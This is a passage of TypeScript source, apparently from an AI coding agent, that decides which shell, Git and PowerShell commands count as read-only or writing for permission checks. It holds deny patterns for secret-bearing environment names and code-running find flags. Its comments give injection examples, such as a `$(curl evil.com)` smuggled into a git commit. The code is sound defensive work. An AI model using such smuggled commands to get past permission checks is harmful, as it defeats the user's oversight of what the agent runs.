/**
 * Permission Utilities
 *
 * 权限工具函数 - 模式解析、匹配、路径检查
 *
 * Pattern format (ONLY for Bash tool in accept-edits mode):
 * - "Bash(npm install)" - exact command match
 * - "Bash(git commit:*)" - prefix wildcard match (matches "git commit -m 'msg'" etc.)
 * - "Bash(npm:*)" - command prefix wildcard (matches "npm install", "npm run build" etc.)
 *
 * Note: Bash(*) is REJECTED for safety. Use specific command patterns.
 */

import fs from 'fs';
import path from 'path';
import os from 'os';

import {
  getAgentConfigHome,
  isPathInsideDirectory,
  resolveExecutionPath,
} from '@kodax-ai/agent';
import type { BashPrefixExtractor, BashPrefixResult } from '../guardrails/auto-mode/bash-prefix-extractor.js';
import { isToolPlanModeAllowed } from '../tools/registry.js';
import type { RunScopedToolDefinition } from '../extensions/runtime-contract.js';
import {
  BASH_SAFE_READ_COMMANDS,
  BASH_WRITE_COMMANDS,
  FILE_MODIFICATION_TOOLS,
} from './shell-command-sets.js';
import { isNullDevice, parseBashCommand } from './bash-ast.js';
import { analyzePowerShellMutation } from './powershell-mutation.js';
import {
  canonicalizeAgentHomePolicyPath,
  isAutoWritableAgentHomePath,
  isProtectedAgentHomeReadTarget,
} from './agent-home-policy.js';

export type PermissionMode =
  | 'plan'
  | 'accept-edits'
  | 'auto'
  | 'full-access'
  | 'auto-in-project';

const PLAN_MODE_PROJECT_DOC_RELATIVE_PATH = path.join('.agent', 'plan_mode_doc.md');
const existingPathPrefixCache = new Map<string, string>();
let cachedSystemTempDirectories: string[] | null = null;

// ============== Pattern Parsing and Matching ==============

const SIMPLE_GIT_READ_SUBCOMMANDS = new Set([
  'status', 'log', 'diff', 'show', 'ls-files', 'rev-parse', 'grep', 'describe',
]);
const GIT_GLOBAL_OPTIONS_WITH_VALUE = new Set([
  '-C', '--git-dir', '--work-tree', '--namespace', '--super-prefix',
]);
const GIT_GLOBAL_PATH_OPTIONS = new Set(['--git-dir', '--work-tree']);
const GIT_GLOBAL_FLAGS = new Set([
  '--bare', '--no-pager', '--no-replace-objects', '--literal-pathspecs',
  '--glob-pathspecs', '--noglob-pathspecs', '--icase-pathspecs',
  '--no-optional-locks',
]);
const GIT_BRANCH_MUTATION_FLAGS = new Set([
  '-d', '-D', '-m', '-M', '-c', '-C', '-f', '-t', '-u', '--delete', '--move', '--copy',
  '--force', '--edit-description', '--set-upstream-to', '--unset-upstream',
  '--create-reflog', '--track', '--no-track', '--recurse-submodules',
]);
const GIT_TAG_MUTATION_FLAGS = new Set([
  '-a', '-s', '-u', '-d', '-f', '-m', '-F', '--annotate', '--sign',
  '--local-user', '--delete', '--force', '--message', '--file', '--create-reflog',
]);
const GIT_READ_EXECUTION_FLAGS = new Set([
  '--ext-diff', '--textconv', '--open-files-in-pager', '--output', '--ext-grep', '--help',
]);
const GIT_CONFIG_MUTATION_FLAGS = new Set([
  '--add', '--replace-all', '--unset', '--unset-all', '--rename-section',
  '--remove-section', '--edit', '-e',
]);
const GIT_CONFIG_READ_FLAGS = new Set([
  '--get', '--get-all', '--get-regexp', '--get-urlmatch', '--list', '-l',
]);
const GIT_CONFIG_WRITE_ACTIONS = new Set([
  'set', 'unset', 'rename-section', 'remove-section', 'edit',
]);

function consumeGitGlobalOptions(
  argv: readonly string[],
  pathIndexes?: Set<number>,
  pathValues?: Set<string>,
): number | undefined {
  let index = 1;
  while (index < argv.length && argv[index]!.startsWith('-')) {
    const token = argv[index]!;
    const normalizedToken = token.toLowerCase();
    // `-c` changes repository configuration and may activate external helpers.
    // Keep the comparison case-sensitive because Git's benign `-C` option is
    // a distinct global option.
    if (token === '-c' || (token.startsWith('-c') && token.length > 2)
      || normalizedToken === '--config-env'
      || normalizedToken.startsWith('--config-env=')) return undefined;
    const separatePathOption = token === '-C'
      || GIT_GLOBAL_PATH_OPTIONS.has(normalizedToken);
    if (separatePathOption) {
      const value = argv[index + 1];
      if (!value) return undefined;
      pathIndexes?.add(index + 1);
      pathValues?.add(value);
      index += 2;
      continue;
    }
    const longPathOption = [...GIT_GLOBAL_PATH_OPTIONS]
      .find((option) => normalizedToken.startsWith(`${option}=`));
    const attachedPathValue = longPathOption
      ? token.slice(longPathOption.length + 1)
      : token.startsWith('-C') && token.length > 2
        ? token.slice(2)
        : undefined;
    if (attachedPathValue !== undefined) {
      if (!attachedPathValue) return undefined;
      pathIndexes?.add(index);
      pathValues?.add(attachedPathValue);
      index += 1;
      continue;
    }
    if (GIT_GLOBAL_FLAGS.has(normalizedToken)) {
      index += 1;
      continue;
    }
    if (GIT_GLOBAL_OPTIONS_WITH_VALUE.has(token)
      || GIT_GLOBAL_OPTIONS_WITH_VALUE.has(normalizedToken)) {
      if (argv[index + 1] === undefined) return undefined;
      index += 2;
      continue;
    }
    if ([...GIT_GLOBAL_OPTIONS_WITH_VALUE].some((option) => (
      token.startsWith(`${option}=`) || normalizedToken.startsWith(`${option}=`)
    ))
      || (token.startsWith('-C') && token.length > 2)) {
      index += 1;
      continue;
    }
    return undefined;
  }
  return index;
}

/** Return the subcommand position after validated Git global options. */
export function findGitSubcommandIndex(argv: readonly string[]): number | undefined {
  return consumeGitGlobalOptions(argv);
}

function gitFormatValues(
  args: readonly string[],
  optionNames: readonly string[],
  consumeSeparate: boolean,
): string[] {
  const values: string[] = [];
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') break;
    const option = optionNames.find((name) => longOptionCouldMatch(token, name));
    if (!option) continue;
    const separator = token.indexOf('=');
    if (separator >= 0) values.push(token.slice(separator + 1));
    else if (consumeSeparate && args[index + 1] !== undefined) {
      values.push(args[index + 1]!);
      index += 1;
    }
  }
  return values;
}

function hasActiveGitFormatSequence(
  format: string,
  matches: (suffix: string) => boolean,
): boolean {
  for (let index = 0; index < format.length; index += 1) {
    if (format[index] !== '%') continue;
    let end = index + 1;
    while (format[end] === '%') end += 1;
    if ((end - index) % 2 === 1 && matches(format.slice(end))) return true;
    index = end - 1;
  }
  return false;
}

function hasGitPrettySignaturePlaceholder(format: string): boolean {
  return hasActiveGitFormatSequence(format, (suffix) => /^[+\- ]?G[?GSKFPT]/.test(suffix));
}

function hasGitRefSignatureAtom(format: string): boolean {
  return hasActiveGitFormatSequence(
    format,
    (suffix) => /^\(\*?signature(?::[^)]*)?\)/i.test(suffix),
  );
}

const BUILTIN_GIT_PRETTY_FORMATS = new Set([
  'oneline', 'short', 'medium', 'full', 'fuller', 'reference', 'email', 'raw', 'mboxrd',
]);

function gitPrettyFormatMayVerifySignature(format: string): boolean {
  if (hasGitPrettySignaturePlaceholder(format)) return true;
  const lower = format.toLowerCase();
  if (lower.startsWith('format:') || lower.startsWith('tformat:') || format.includes('%')) {
    return false;
  }
  return !BUILTIN_GIT_PRETTY_FORMATS.has(lower);
}

/** True when a Git inspection may invoke a configured signature helper. */
export function gitSignatureInspectionMayExecute(
  subcommand: string | undefined,
  args: readonly string[],
): boolean {
  if (subcommand === 'stash' && args[0]?.toLowerCase() === 'list') {
    return gitSignatureInspectionMayExecute('log', args.slice(1));
  }
  const optionBoundary = args.indexOf('--');
  const optionArgs = optionBoundary < 0 ? args : args.slice(0, optionBoundary);
  if (subcommand === 'tag' && optionArgs.some((token) => (
    token === '-v' || longOptionCouldMatch(token, '--verify')
  ))) return true;
  if ((subcommand === 'log' || subcommand === 'show')
    && optionArgs.some((token) => longOptionCouldMatch(token, '--show-signature'))) {
    return true;
  }
  if (subcommand === 'log' || subcommand === 'show') {
    return gitFormatValues(args, ['--format'], true).some(hasGitPrettySignaturePlaceholder)
      || gitFormatValues(args, ['--pretty'], false).some(gitPrettyFormatMayVerifySignature);
  }
  if (subcommand === 'branch' || subcommand === 'tag') {
    return gitFormatValues(args, ['--format'], true).some(hasGitRefSignatureAtom);
  }
  return false;
}

function hasGitMutationArguments(
  args: readonly string[],
  mutationFlags: ReadonlySet<string>,
): boolean {
  const shortMutationFlags = new Set([...mutationFlags]
    .filter((flag) => /^-[^-]$/.test(flag))
    .map((flag) => flag.slice(1)));
  return args.some((token) => mutationFlags.has(token)
    || [...mutationFlags].some((flag) => (
      (flag.startsWith('--') && token.startsWith(`${flag}=`))
    ))
    || shortOptionClusterContains(token, shortMutationFlags, new Set()))
    || args.some((token) => !token.startsWith('-'));
}

export interface GitGrepShortOption {
  readonly pager: boolean;
  readonly valueKind?: 'pattern' | 'pattern-file' | 'other';
  readonly attachedValue?: string;
  readonly consumesNext: boolean;
}

/** Parse Git grep's clusterable short options until an option consumes the remainder. */
export function parseGitGrepShortOption(token: string): GitGrepShortOption {
  if (!token.startsWith('-') || token.startsWith('--') || token.length < 2) {
    return { pager: false, consumesNext: false };
  }
  for (let index = 1; index < token.length; index += 1) {
    const option = token[index]!;
    if (option === 'O') return { pager: true, consumesNext: false };
    const valueKind = option === 'e'
      ? 'pattern'
      : option === 'f'
        ? 'pattern-file'
        : 'mABC'.includes(option)
          ? 'other'
          : undefined;
    if (valueKind) {
      const attachedValue = token.slice(index + 1) || undefined;
      return {
        pager: false,
        valueKind,
        attachedValue,
        consumesNext: attachedValue === undefined,
      };
    }
  }
  return { pager: false, consumesNext: false };
}

function hasGitGrepPagerOption(args: readonly string[]): boolean {
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') return false;
    if (token === '--regexp' || token === '--file') {
      index += 1;
      continue;
    }
    const parsed = parseGitGrepShortOption(token);
    if (parsed.pager) return true;
    if (parsed.consumesNext) index += 1;
  }
  return false;
}

function isGitReadCommand(argv: readonly string[]): boolean {
  const subcommandIndex = findGitSubcommandIndex(argv);
  if (subcommandIndex === undefined) return false;
  const rawSubcommand = argv[subcommandIndex];
  if (!rawSubcommand) return false;
  const subcommand = rawSubcommand.toLowerCase();
  const args = argv.slice(subcommandIndex + 1);
  const normalizedArgs = args.map((token) => token.toLowerCase());
  const optionBoundary = normalizedArgs.indexOf('--');
  const optionArgs = optionBoundary < 0 ? normalizedArgs : normalizedArgs.slice(0, optionBoundary);
  if (optionArgs.some((token) => GIT_READ_EXECUTION_FLAGS.has(token)
    || [...GIT_READ_EXECUTION_FLAGS].some((flag) => token.startsWith(`${flag}=`)))
    || (subcommand === 'grep' && hasGitGrepPagerOption(args))) {
    return false;
  }
  if (SIMPLE_GIT_READ_SUBCOMMANDS.has(subcommand)) return true;
  if (subcommand === 'stash') {
    return normalizedArgs[0] === 'list' || normalizedArgs[0] === 'show';
  }
  if (subcommand === 'config') {
    const action = normalizedArgs[0];
    if (GIT_CONFIG_WRITE_ACTIONS.has(action ?? '')) return false;
    const readMode = action === 'get' || action === 'list'
      || normalizedArgs.some((token) => GIT_CONFIG_READ_FLAGS.has(token));
    return readMode && !normalizedArgs.some((token) => GIT_CONFIG_MUTATION_FLAGS.has(token));
  }
  if (subcommand === 'branch') {
    const explicitlyLists = normalizedArgs.some((token) => [
      '--list', '-l', '--contains', '--no-contains', '--merged', '--no-merged',
      '--points-at', '--show-current', '--all', '-a', '--remotes', '-r',
    ].includes(token) || [
      '--list=', '--contains=', '--no-contains=', '--merged=', '--no-merged=',
      '--points-at=',
    ].some((prefix) => token.startsWith(prefix)));
    const hasPositional = args.some((token) => !token.startsWith('-'));
    return !hasGitMutationArguments(
      args.filter((token) => token.startsWith('-')),
      GIT_BRANCH_MUTATION_FLAGS,
    ) && (!hasPositional || explicitlyLists);
  }
  if (subcommand === 'tag') {
    if (gitSignatureInspectionMayExecute(subcommand, args)) return true;
    const listsTags = args.length === 0
      || normalizedArgs.every((token) => token.startsWith('-'))
      || normalizedArgs.includes('-l') || normalizedArgs.includes('--list');
    return listsTags && !hasGitMutationArguments(
      args.filter((token) => token.startsWith('-')),
      GIT_TAG_MUTATION_FLAGS,
    );
  }
  if (subcommand === 'remote') {
    const action = normalizedArgs.find((token) => !token.startsWith('-'));
    if (action === undefined || action === 'get-url') return true;
    if (action !== 'show') return false;
    return normalizedArgs.includes('-n') || normalizedArgs.includes('--no-query');
  }
  return false;
}

const SENSITIVE_ENVIRONMENT_NAME = /(?:^|_)(?:api_?key|access_?key|secret|token|password|passwd|credential|private_?key|auth|cookie)(?:_|$)/i;
const POWERSHELL_COMPARISON_OPERATORS = new Set([
  '-eq', '-ne', '-gt', '-ge', '-lt', '-le', '-like', '-notlike',
  '-match', '-notmatch', '-contains', '-notcontains', '-in', '-notin',
]);

function isSafePowerShellLiteral(value: string): boolean {
  return value.length > 0
    && !/[${};&|<>`]/.test(value)
    && !value.includes('$(');
}

function isSafePowerShellEnvironmentRead(argv: readonly string[]): boolean {
  const match = /^\$env:([a-z_][a-z0-9_]*)$/i.exec(argv[0] ?? '');
  if (!match || SENSITIVE_ENVIRONMENT_NAME.test(match[1]!)) return false;
  if (argv.length === 1) return true;
  return argv.length === 3
    && ['-split', '-like', '-notlike', '-match', '-notmatch'].includes(
      argv[1]?.toLowerCase() ?? '',
    )
    && (argv[2]?.length ?? 0) > 0
    && !/[{}&|<>`]/.test(argv[2] ?? '')
    && !(argv[2] ?? '').includes('$(');
}

function isSafeWhereObjectRead(argv: readonly string[]): boolean {
  const args = argv.slice(1);
  const expression = args[0] === '{' && args.at(-1) === '}'
    ? args.slice(1, -1)
    : args;
  if (expression.length !== 3) return false;
  const [left, operator, right] = expression;
  // shell-quote normalizes PowerShell's `$_.Name` token to `$_Name`. Accept
  // that parser spelling as well as the literal PowerShell spelling.
  return /^\$_(?:(?:\.)?[a-z_][a-z0-9_]*)?$/i.test(left ?? '')
    && POWERSHELL_COMPARISON_OPERATORS.has(operator?.toLowerCase() ?? '')
    && isSafePowerShellLiteral(right ?? '');
}

function isSafeSelectObjectRead(argv: readonly string[]): boolean {
  const switches = new Set(['-unique', '-wait']);
  const numericOptions = new Set(['-first', '-last', '-skip', '-index']);
  const propertyOptions = new Set(['-property', '-expandproperty']);
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    const normalized = token.toLowerCase();
    if (switches.has(normalized)) continue;
    if (numericOptions.has(normalized)) {
      if (!/^\d+(?:,\d+)*$/.test(argv[++index] ?? '')) return false;
      continue;
    }
    if (propertyOptions.has(normalized)) {
      if (!/^(?:\*|[a-z_][a-z0-9_]*)(?:,(?:\*|[a-z_][a-z0-9_]*))*$/i.test(
        argv[++index] ?? '',
      )) return false;
      continue;
    }
    if (!/^(?:\*|[a-z_][a-z0-9_]*)(?:,(?:\*|[a-z_][a-z0-9_]*))*$/i.test(token)) {
      return false;
    }
  }
  return true;
}

function isSafeRipgrepRead(argv: readonly string[]): boolean {
  return !argv.slice(1).some((token) => (
    /^--pre(?:=|$)/i.test(token) || /^--hostname-bin(?:=|$)/i.test(token)
  ));
}

const EFFECTFUL_FIND_ACTION = /^(?:-delete|-exec|-execdir|-ok|-okdir|-fprint|-fprint0|-fprintf|-fls)$/i;

function isSafeFindRead(argv: readonly string[]): boolean {
  return !argv.slice(1).some((token) => EFFECTFUL_FIND_ACTION.test(token));
}

const LESS_SHORT_VALUE_OPTIONS = new Set(['b', 'h', 'j', 'k', 'p', 'P', 't', 'T', 'x', 'y', 'z']);
const TREE_SHORT_VALUE_OPTIONS = new Set(['H', 'I', 'L', 'P', 'T']);
const LESS_OUTPUT_OPTIONS = new Set(['o', 'O']);
const TREE_OUTPUT_OPTIONS = new Set(['o']);
const TREE_LONG_VALUE_OPTIONS = new Set([
  '--charset', '--filelimit', '--output', '--sort', '--timefmt',
]);

function longOptionCouldMatch(token: string, fullName: string): boolean {
  const separator = token.indexOf('=');
  const option = (separator >= 0 ? token.slice(0, separator) : token).toLowerCase();
  return option.startsWith('--') && option.length >= 3 && fullName.startsWith(option);
}

function shortOptionClusterContains(
  token: string,
  targets: ReadonlySet<string>,
  valueOptions: ReadonlySet<string>,
): boolean {
  if (!/^-[^-]/.test(token)) return false;
  for (const option of token.slice(1)) {
    if (targets.has(option)) return true;
    if (valueOptions.has(option)) return false;
  }
  return false;
}

function isSafeLessRead(argv: readonly string[]): boolean {
  return !argv.slice(1).some((token) => (
    shortOptionClusterContains(token, LESS_OUTPUT_OPTIONS, LESS_SHORT_VALUE_OPTIONS)
    || longOptionCouldMatch(token, '--log-file')
  ));
}

function isSafeTreeRead(argv: readonly string[]): boolean {
  return !argv.slice(1).some((token) => (
    shortOptionClusterContains(token, TREE_OUTPUT_OPTIONS, TREE_SHORT_VALUE_OPTIONS)
    || longOptionCouldMatch(token, '--output')
  ));
}

function isSafeDateRead(argv: readonly string[]): boolean {
  const args = argv.slice(1);
  if (args.length === 0) return true;
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index] ?? '';
    const lower = token.toLowerCase();
    if (lower === '/t' || lower === '--help' || lower === '--version'
      || token.startsWith('+')) continue;
    if (lower === '-s' || lower === '--set' || lower.startsWith('--set=')) return false;
    if (['-d', '--date', '-r', '--reference'].includes(lower)) {
      if (args[++index] === undefined) return false;
      continue;
    }
    if (/^--(?:date|reference)=/i.test(token)) continue;
    if (/^(?:-u|--utc|--universal|-R|--rfc-email|--resolution|--debug)$/i.test(token)
      || /^--(?:iso-8601|rfc-3339)(?:=|$)/i.test(token)) continue;
    return false;
  }
  return true;
}

function isBareShellExecutable(value: string): boolean {
  return value.length > 0 && !/[\\/]/.test(value);
}

/** Validate one already-tokenized shell pipeline stage as read-only. */
export function isShellReadOnlyArgv(argv: readonly string[]): boolean {
  if (argv.length === 0) {
    return false;
  }
  if (!isBareShellExecutable(argv[0] ?? '')) return false;
  if (isSafePowerShellEnvironmentRead(argv)) return true;
  const rawExecutable = (argv[0] ?? '').toLowerCase();
  const executable = commandBasename(argv[0] ?? '');
  if (rawExecutable === 'where.exe') return true;
  if (executable === 'where-object' || rawExecutable === 'where' || rawExecutable === '?') {
    return isSafeWhereObjectRead(['where-object', ...argv.slice(1)]);
  }
  if (executable === 'select-object') return isSafeSelectObjectRead(argv);
  if (executable === 'rg' || executable === 'ripgrep') return isSafeRipgrepRead(argv);
  if (executable === 'find') return isSafeFindRead(argv);
  // less may execute LESSOPEN/LESSCLOSE preprocessors inherited from the
  // environment, so syntax alone cannot prove that it is a pure file read.
  if (executable === 'less') return false;
  if (executable === 'tree') return isSafeTreeRead(argv);
  if (executable === 'date') return isSafeDateRead(argv);

  const normalizedArgv = [executable, ...argv.slice(1).map((token) => token.toLowerCase())];
  const normalizedCommand = normalizedArgv.join(' ');
  if (executable === 'git') return isGitReadCommand([executable, ...argv.slice(1)]);

  // 1. Base command validation: Must start with a whitelisted command
  // e.g. "git status -s" starts with "git status"
  for (const safeCmd of BASH_SAFE_READ_COMMANDS) {
    if (normalizedCommand === safeCmd || normalizedCommand.startsWith(safeCmd + ' ')) {
      // Block arbitrary code execution for language tools (version/info only)
      const languageTools = ['npm', 'tsc', 'go', 'cargo', 'rustc'];
      if (languageTools.includes(safeCmd)) {
        const parts = normalizedCommand.split(/\s+/).slice(1); // skip the command itself
        // Only allow info flags like -v, --version, -h, --help
        // If there are any other arguments (like a script name or -e), require confirmation
        if (parts.length > 0 && !parts.every(p => /^(-v|--version|-h|--help)$/.test(p))) {
          return false;
        }
      }
      return true;
    }
  }

  return false; // Default to denying (requiring confirmation)
}

/**
 * Token pattern for `isHelpCommand` non-flag tokens. Strict alphanumeric match —
 * rejects paths (`./bin/foo`), versioned filenames (`script.js`), shell metachars
 * (`$VAR`), and any other construct that could be smuggled past a "looks like a
 * help command" check.
 */
const HELP_COMMAND_TOKEN_PATTERN = /^[a-zA-Z0-9]+$/;

/**
 * FEATURE_154 — universal `--help` fast-path (parity with Claude Code
 * `commands.ts:isHelpCommand` at [commands.ts:388-436]).
 *
 * Returns `true` for commands of the shape `[CMD [SUBCMD ...]] --help` where
 * every non-flag token is a simple alphanumeric identifier and `--help` is
 * the only flag. These commands are unconditionally safe (programs print
 * help and exit), so they fast-path past the LLM classifier (FEATURE_092)
 * and the safe-read whitelist.
 *
 * Why: KodaX's auto-mode classifier costs an LLM call per tool invocation.
 * Paying token cost on every `kubectl --help` / `docker --help` etc. is
 * waste. Pre-FEATURE_154, KodaX only fast-pathed `--help` for ~12 language
 * toolchains (`npm` / `tsc` / `go` / etc.) via the `languageTools` carve-out
 * in `isSingleBashReadCommand`; this generalises to any command name.
 *
 * Strict by design (matches CC):
 *   - Must end with `--help` (after trim)
 *   - Must NOT contain `'` or `"` (could hide injection behind alphanumerics)
 *   - Must contain `--help` exactly; any other flag (`-c`, `--version`, etc.) → false
 *   - Every non-flag token must match `/^[a-zA-Z0-9]+$/` (rejects paths,
 *     versioned files, env vars, shell metacharacters)
 *
 * Slightly stricter than CC on `$VAR` (CC's shell-quote tokenizer represents
 * env-substitutions as object tokens that the loop skips, effectively
 * letting them pass; KodaX's simple split sees them as strings and rejects.
 * The stricter behavior is a deliberate safety choice.).
 */
export function isHelpCommand(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed.endsWith('--help')) {
    return false;
  }
  // Reject any quoted argument — could hide injection (`python -c 'evil()' --help`).
  if (trimmed.includes('"') || trimmed.includes("'")) {
    return false;
  }

  let foundHelp = false;
  for (const token of trimmed.split(/\s+/)) {
    if (token.startsWith('-')) {
      if (token === '--help') {
        foundHelp = true;
      } else {
        return false;
      }
    } else {
      if (!HELP_COMMAND_TOKEN_PATTERN.test(token)) {
        return false;
      }
    }
  }
  return foundHelp;
}

/**
 * Check if a bash command is strictly a safe read-only operation (Whitelist).
 *
 * FEATURE_152 (v0.7.38): replaces the pre-AST regex strip-then-classify
 * pipeline with `parseBashCommand` from `bash-ast.ts`. The AST gives us:
 *   - statements split on `&&` / `||` / `;` (we only allow null and `&&`),
 *   - pipeline stages split on `|` (every stage must be a safe-read command),
 *   - per-stage redirections (input redirects rejected; output redirects only
 *     allowed when the target is a null device, which discards output rather
 *     than writing — preserves Issue 129 behavior),
 *   - `unparseable: true` for inputs we can't model (heredocs, command
 *     substitution `$(...)`, backticks, bare `&`, etc.) — fail-closed to
 *     `false` so unmodeled syntax always falls through to confirmation.
 *
 * Per-stage syntactic checks use `isShellReadOnlyArgv` so quoted tokens do not
 * need to be joined and parsed a second time.
 *
 * @param command - bash command string
 * @returns true if the command is a safe read operation
 */
export function isBashReadCommand(command: string): boolean {
  if (!command || !command.trim()) {
    return false;
  }

  // FEATURE_152: AST parse. `parseBashCommand` preserves every unquoted
  // physical line as a statement boundary so the permission model validates
  // the same complete sequence that the configured shell will execute.
  const tree = parseBashCommand(command.trim());
  if (tree.unparseable || tree.statements.length === 0) {
    return false;
  }

  const isCompound = tree.statements.length > 1
    || (tree.statements[0]?.stages.length ?? 0) > 1;

  for (const stmt of tree.statements) {
    // Sequential PowerShell inspection commonly uses `;`. It is safe only
    // because every resulting statement and pipeline stage is independently
    // validated below. Keep `||` rejected because its shell semantics vary.
    if (stmt.precedingOp !== null
      && stmt.precedingOp !== '&&'
      && stmt.precedingOp !== ';') {
      return false;
    }

    for (const stage of stmt.stages) {
      // Redirection policy:
      //   - input redirects (`<`, `<<`, `<<<`) → reject (could read from
      //     anything, breaks read-only contract).
      //   - output redirects (`>`, `>>`, `2>`, `&>`, etc.) → reject UNLESS
      //     target is a null device. fd-redirect to null discards output;
      //     this is the Issue 129 carve-out, now expressed structurally.
      for (const redir of stage.redirections) {
        if (redir.descriptorDuplication) continue;
        if (redir.input) return false;
        if (!isNullDevice(redir.target)) return false;
      }

      // Stage commands run through the token-preserving validator below; the
      // string is retained only for the empty-stage guard.
      const stageStr = stage.argv.join(' ');
      if (!stageStr) continue;

      // 'cd <path>' is allowed only inside compound commands (preserves
      // the pre-AST behavior — bare `cd` alone is not a "read" operation).
      if (isCompound && stage.argv[0]?.toLowerCase() === 'cd' && stage.argv.length >= 2) {
        continue;
      }

      if (!isShellReadOnlyArgv(stage.argv)) {
        return false;
      }
    }
  }

  return true;
}

export function getDirectShellBypassBlockReason(command: string): string | null {
  const normalizedCommand = command.trim();

  if (!normalizedCommand) {
    return '[Shell: No command provided]';
  }

  if (isBashReadCommand(normalizedCommand)) {
    return null;
  }

  return `[Blocked] Direct !command execution only supports safe read-only commands. Use the bash tool for commands that write files, invoke shells, or require confirmation.`;
}

/**
 * PowerShell write cmdlets that don't appear in `BASH_WRITE_COMMANDS` (which
 * only lists POSIX-y verbs). These can appear ANYWHERE in argv (not just
 * argv[0]) because PowerShell pipelines compose them inline:
 *   `Get-ChildItem | Set-Content foo.txt`  → second stage's argv[0]
 *   `New-Item -Path foo`                    → first stage's argv[0]
 * `ni` is the New-Item alias; `del` / `copy` / `move` / `ren` already covered
 * by `BASH_WRITE_COMMANDS`.
 */
const POWERSHELL_WRITE_TOKENS = new Set([
  'remove-item',
  'set-content',
  'add-content',
  'out-file',
  'new-item',
  'copy-item',
  'move-item',
  'rename-item',
  'ni',
]);

const NESTED_SHELL_COMMAND_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  bash: new Set(['-c']),
  dash: new Set(['-c']),
  sh: new Set(['-c']),
  zsh: new Set(['-c']),
  cmd: new Set(['/c']),
  powershell: new Set(['-command', '-c']),
  pwsh: new Set(['-command', '-c']),
};

function getNestedShellCommand(argv: readonly string[]): string | undefined {
  const executablePath = argv[0]?.replace(/\\/g, '/');
  const executable = executablePath
    ?.slice(executablePath.lastIndexOf('/') + 1)
    .replace(/\.exe$/i, '')
    .toLowerCase();
  if (!executable) return undefined;
  const flags = NESTED_SHELL_COMMAND_FLAGS[executable];
  if (!flags) return undefined;
  const flagIndex = argv.findIndex((value, index) => index > 0 && flags.has(value.toLowerCase()));
  return flagIndex >= 0 ? argv[flagIndex + 1] : undefined;
}

/**
 * Check if a bash command is a write operation.
 *
 * FEATURE_152 (v0.7.38): replaces the pre-AST regex blacklist with
 * `parseBashCommand` from `bash-ast.ts`. The AST eliminates two whole
 * classes of false positives the regex chain had:
 *   1. **Issue 129 strip-then-classify**: pre-AST code regex-stripped
 *      `2>NUL` / `2>/dev/null` BEFORE pattern matching, then ran a
 *      blacklist of pre-compiled regexes. The strip was fragile — any
 *      future fd-redirect form would re-introduce the false positive.
 *      Now redirections are structured tokens with a `target` field;
 *      `isNullDevice(target)` is the single source of truth.
 *   2. **Substring matches inside argv strings**: pre-AST `\\bset-content\\b`
 *      matched `set-content` even when it appeared inside a quoted string
 *      argument or inside a path. AST argv tokens are post-quote-stripping
 *      so PowerShell verb checks compare against actual command names.
 *
 * Detection rules (per-stage):
 *   - argv[0] OR argv[0..1] (joined with space) matches any entry in
 *     `BASH_WRITE_COMMANDS` (handles both `rm` and `git commit`).
 *   - any argv token matches a `POWERSHELL_WRITE_TOKENS` entry (these can
 *     appear inline, not just at stage start, due to PowerShell pipeline
 *     conventions — `ls | Set-Content foo` puts the verb at argv[0] of
 *     stage 2, but `New-Item -Path foo -Value bar` has it as argv[0] of
 *     stage 1; we cover both with a token-anywhere check).
 *   - any non-input redirection whose target is NOT a null device.
 *
 * Unparseable inputs (heredocs, `$(...)`) are conservatively returned as
 * `false` to match the pre-AST regex chain's behavior — those inputs just
 * didn't match anything in the regex blacklist either. Plan-mode and
 * auto-mode handle the unparseable case via separate confirmation paths.
 *
 * @param command - bash command string
 * @returns true if the command is a write operation
 */
export function isBashWriteCommand(command: string): boolean {
  return isBashWriteCommandAtDepth(command, 0);
}

function isBashWriteCommandAtDepth(command: string, depth: number): boolean {
  if (!command || !command.trim()) {
    return false;
  }

  const tree = parseBashCommand(command);
  if (tree.unparseable) {
    // Match pre-AST behavior on unparseable inputs (return false). Plan-
    // mode + auto-mode upstream pipelines treat unparseable bash as a
    // confirmation case via different logic — this function is purely
    // "does the command match a known write pattern".
    return false;
  }

  for (const stmt of tree.statements) {
    for (const stage of stmt.stages) {
      const argvLower = stage.argv.map((tok) => tok.toLowerCase());

      // Rule 1: argv[0] / argv[0..1] against BASH_WRITE_COMMANDS
      if (argvLower.length > 0) {
        const first = argvLower[0]!;
        const firstTwo = argvLower.length >= 2
          ? `${argvLower[0]} ${argvLower[1]}`
          : null;
        for (const writeCmd of BASH_WRITE_COMMANDS) {
          if (writeCmd === first) return true;
          if (firstTwo !== null && writeCmd === firstTwo) return true;
        }
      }

      // Rule 2: PowerShell verb anywhere in argv
      for (const token of argvLower) {
        if (POWERSHELL_WRITE_TOKENS.has(token)) return true;
      }

      // Rule 3: non-input redirect to a real (non-null-device) target
      for (const redir of stage.redirections) {
        if (redir.descriptorDuplication) continue;
        if (redir.input) continue;
        if (!isNullDevice(redir.target)) return true;
      }

      const nested = depth < 3 ? getNestedShellCommand(stage.argv) : undefined;
      if (nested !== undefined && isBashWriteCommandAtDepth(nested, depth + 1)) return true;
    }
  }

  return false;
}

/**
 * Parse allowed tool pattern - 解析允许的工具模式
 *
 * Formats:
 * - "read" -> { tool: "read", pattern: null }
 * - "Edit(*)" -> { tool: "Edit", pattern: "*" }
 * - "Bash(npm install)" -> { tool: "Bash", pattern: "npm install" }
 * - "Bash(git commit:*)" -> { tool: "Bash", pattern: "git commit:*" }
 */
export function parseAllowedToolPattern(entry: string): { tool: string; pattern: string | null } {
  const match = entry.match(/^([a-zA-Z_][a-zA-Z0-9_]*)\((.+)\)$/);
  if (match) {
    return { tool: match[1].toLowerCase(), pattern: match[2] };
  }
  return { tool: entry.toLowerCase(), pattern: null };
}

/**
 * Check if a bash command matches an allowed pattern using LEGACY naive
 * `startsWith` semantics. Used when no LLM-backed prefix extractor is
 * available — see `matchesBashPatternByExtractedPrefix` for the safer path.
 *
 * SECURITY NOTE: this path is vulnerable to command injection via shell
 * metacharacters (`git commit -m "x" $(curl evil.com)` matches `git commit:*`).
 * It is preserved for backward compatibility with SDK consumers that don't
 * have an LLM provider available; the KodaX REPL itself ALWAYS provides
 * an extractor in production, so this branch is only exercised by tests
 * and headless embeds. Will be removed when all known consumers migrate
 * (target: v0.8).
 */
function matchesBashPatternLegacy(command: string, pattern: string): boolean {
